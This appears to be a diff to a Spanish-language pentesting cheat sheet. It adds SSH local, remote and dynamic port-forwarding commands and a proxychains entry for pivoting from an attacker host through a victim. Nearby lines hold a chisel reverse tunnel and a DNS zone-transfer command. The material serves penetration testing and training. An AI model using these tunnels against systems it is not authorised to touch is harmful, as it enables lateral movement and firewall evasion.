@@ -45,11 +45,33 @@ Atacante
 ```
 ./chisel server --reverse -p ATACKER_PORT
 ```
-
 Víctima
 ```
 ./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
 ```
+#### SSH 
+
+Local Port Forwarding
+```
+ssh -N -L ATTACKER_IP:ATTACKER_PORT:VICTIM_IP:VICTIM_PORT victimuser@ip
+```
+Remort Port Forwarding (Firewall)
+```
+ssh -N -R ATTACKER_IP:ATTACKER_PORT(listener):VICTIM_IP:VICTIM_PORT attackeruser@attackerip
+```
+Dynamic Port Forwarding (Pivoting)
+```
+ssh -N -D ATTACKER_IP:ATTACKER_PORT victimuser@ip
+```
+(Edit ProxyChains)
+```
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks4 ATTACKER_IP(localhost)_ATTACKER PORT
+```
+
 ### Domain Zone Transfer (AXFR)
 ```
 dig @IP dominio axfr
